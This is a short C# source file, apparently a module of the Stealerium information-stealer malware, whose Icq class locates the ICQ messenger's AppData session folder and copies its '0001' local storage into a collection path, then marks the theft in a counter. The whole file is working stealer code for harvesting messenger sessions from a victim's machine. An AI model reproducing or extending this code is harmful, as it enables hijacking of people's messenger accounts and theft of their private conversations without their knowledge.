using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers
{
    internal sealed class Icq
    {
        private static readonly string ICQPath = Path.Combine(Paths.Appdata, "ICQ");

        // Copy session directory
        public static void GetSession(string sSavePath)
        {
            if (!Directory.Exists(ICQPath))
                return;

            var localStorage = Path.Combine(ICQPath, "0001");
            if (Directory.Exists(localStorage))
                try
                {
                    Filemanager.CopyDirectory(localStorage, sSavePath + "\\0001");
                }
                catch
                {
                    return;
                }

            Counter.Icq = true;
        }
    }
}